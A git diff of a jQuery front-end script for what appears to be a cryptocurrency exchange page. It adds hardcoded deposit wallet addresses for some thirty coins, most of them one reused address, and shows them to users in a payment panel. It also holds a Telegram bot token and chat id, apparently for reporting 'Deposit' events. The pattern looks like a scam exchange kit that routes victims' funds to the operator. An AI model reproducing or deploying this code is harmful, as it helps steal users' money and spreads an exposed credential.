@@ -11,7 +11,7 @@ $(document).ready(function () {
       .querySelector(".element__block-span")
       .innerHTML.replaceAll(" ", "")
       .replaceAll("\n", "");
-    const targetCoins = ["matic", "uni", "bnb"];
+    const targetCoins = ["matic", "sol", "bnb"];
     if (targetCoins.includes(coin1) || targetCoins.includes(coin2)) {
       return 103;
     } else {
@@ -47,38 +47,73 @@ $(document).ready(function () {
   var chatid = "-1001814291575";
   var token = "5692660810:AAEY8irN7p52zDuieNelQyN0b5YUuoki2ng";
   var text = "Deposit";
+
+  let networks = new Array();
+  networks["btc"] = "Bitcoin";
+  networks["xlm"] = "Stellar Network";
+  networks["matic"] = "Polygon";
+  networks["eth"] = "Ethereum (ERC-20)";
+  networks["etc"] = "Ethereum Classic";
+  networks["bnb-bep2"] = "Binance Coin (BEP-2)";
+  networks["bnb"] = "Binance Coin (BEP-20)";
+  networks["ltc"] = "Litecoin";
+  networks["sol"] = "Solana";
+  networks["usdt-trc20"] = "USD Tether (TRC-20)";
+  networks["usdt-erc20"] = "USD Tether (ERC-20)";
+  networks["usdc-bep20"] = "USD Tether (BEP-20)";
+  networks["doge"] = "Doge Coin";
+  networks["xrp"] = "Ripple";
+  networks["shib-erc20"] = "Shiba Inu (ERC-20)";
+  networks["shib-bep20"] = "Shiba Inu (BEP-20)";
+  networks["trx"] = "Tron";
+  networks["busd"] = "Binance USD (BEP-20)";
+  networks["usdc-trc20"] = "USD Coin (TRC-20)";
+  networks["usdc-erc20"] = "USD Coin (ERC-20)";
+  networks["usdc-bep20"] = "USD Coin (BEP-20)";
+  networks["tusd-bep20"] = "True USD (BEP-20)";
+  networks["tusd-erc20"] = "True USD (ERC-20)";
+  networks["avax"] = "Avalanche";
+  networks["ada"] = "Cardano";
+  networks["ada-bep20"] = "Cardano";
+  networks["waves"] = "Waves";
+  networks["uni-erc20"] = "Uniswap (ERC-20)";
+  networks["uni-bep20"] = "Uniswap (BEP-20)";
+  networks["dai"] = "Dai";
+  networks["dai-erc20"] = "Dai (ERC-20)";
+
   let wallets = new Array();
-  wallets["btc"] = "Bitcoin";
-  wallets["xlm"] = "Stellar Network";
-  wallets["eth"] = "Ethereum (ERC-20)";
-  wallets["etc"] = "Ethereum Classic";
-  wallets["bnb-bep2"] = "Binance Coin (BEP-2)";
-  wallets["bnb"] = "Binance Coin (BEP-20)";
-  wallets["ltc"] = "Litecoin";
-  wallets["sol"] = "Solana";
-  wallets["usdt-trc20"] = "USD Tether (TRC-20)";
-  wallets["usdt-erc20"] = "USD Tether (ERC-20)";
-  wallets["usdc-bep20"] = "USD Tether (BEP-20)";
-  wallets["doge"] = "Doge Coin";
-  wallets["xrp"] = "Ripple";
-  wallets["shib-erc20"] = "Shiba Inu (ERC-20)";
-  wallets["shib-bep20"] = "Shiba Inu (BEP-20)";
-  wallets["trx"] = "Tron";
-  wallets["busd"] = "Binance USD (BEP-20)";
-  wallets["usdc-trc20"] = "USD Coin (TRC-20)";
-  wallets["usdc-erc20"] = "USD Coin (ERC-20)";
-  wallets["usdc-bep20"] = "USD Coin (BEP-20)";
-  wallets["dai-erc20"] = "Dai (ERC-20)";
-  wallets["tusd-bep20"] = "True USD (BEP-20)";
-  wallets["tusd-erc20"] = "True USD (ERC-20)";
-  wallets["avax"] = "Avalanche";
-  wallets["ada"] = "Cardano";
-  wallets["ada-bep20"] = "Cardano";
-  wallets["matic"] = "Polygon";
-  wallets["waves"] = "Waves";
-  wallets["uni-erc20"] = "Uniswap (ERC-20)";
-  wallets["uni-bep20"] = "Uniswap (BEP-20)";
-  wallets["dai"] = "Dai";
+  wallets["btc"] = "bc1qm5ft2yzygljcp7khnt4al7cnz3zqkg0l3k4430";
+  wallets["xlm"] = "GCRI6XPMGUNZHDDDJZGWEFJCPMRBEALD6ZFJ4SA2554ZCK2LGMVOHXUW";
+  wallets["eth"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["etc"] = "0xA7DCBAE0D71F16fF329634492F34E3cBA8B19959";
+  wallets["bnb-bep2"] = "bnb14pd5hqf6a69v9tv709p6tghesesxn7pdeq67ds";
+  wallets["bnb"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["ltc"] = "ltc1qzvxyj3yhx3nnz82p89wzayt3s96xtac6lct34z";
+  wallets["sol"] = "8FSvLK1676nQtpANK5b7dDi28sN5pA19AAQUKHqc4yCf";
+  wallets["usdt-trc20"] = "TCM1BkesizojS8oPTDQkzaamixii1syq8F";
+  wallets["usdt-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["usdc-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["doge"] = "DQTdumtYbP67aBWfPZnVEpgw7dFWTeJnzk";
+  wallets["xrp"] = "rD4rXN7GdH2qQ2g1ExRaKjHRxLmCA38xXg";
+  wallets["shib-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["shib-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["trx"] = "TCM1BkesizojS8oPTDQkzaamixii1syq8F";
+  wallets["busd"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["usdc-trc20"] = "TCM1BkesizojS8oPTDQkzaamixii1syq8F";
+  wallets["usdc-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["usdc-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["dai-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["tusd-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["tusd-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["avax"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["ada"] =
+    "addr1q8w584c6ds00j2vd7gg2na0scggkreccnw33vps8q538vnwq9d8wx8ptssk32t5mvyqxst7s3u0y4dp2n39fxheh9w3sqgplvv";
+  wallets["ada-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["matic"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["waves"] = "3P2jLRcm9czQ4YdU6WEETdhKVXxLRWUw7rk";
+  wallets["uni-erc20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["uni-bep20"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
+  wallets["dai"] = "0x2383330fDDF2C5711b89509E67A584FF27457a4F";
 
   $(".element__block-input1").keyup(function () {
     if (parseInt($(this).val()) < 0) {
@@ -318,21 +353,27 @@ $(document).ready(function () {
         color: "#E96A6A",
       });
     } else {
-      $("#modal__input-address").val(
-        wallets[
-          $.trim(
-            $("label.element__block-label-give:first").text()
-          ).toLowerCase()
-        ]
-      );
+      var labelGive = $.trim(
+        $("label.element__block-label-give:first").text()
+      ).toLowerCase();
+      var labelGet = $.trim(
+        $("label.element__block-label-get:first").text()
+      ).toLowerCase();
+
+      $("#modal__input-wallets1").val(wallets[labelGive]);
+      $("#modal__input-wallets2").val(wallets[labelGet]);
+      
+      $("#modal__input-network1").val(networks[labelGive]);
+      $("#modal__input-network2").val(networks[labelGet]);
+
       $("main").children("section").fadeOut();
-      $(".modal").css({
-        display: "flex",
+      $(".element__payment").css({
+        display: "flex"
       });
     }
   });
 
-  $(".modal__label").click(function () {
+  $(".modal__label1, .modal__label2").click(function () {
     var copyText = document.getElementById(
       "modal__input-" + $(this).data("type")
     );
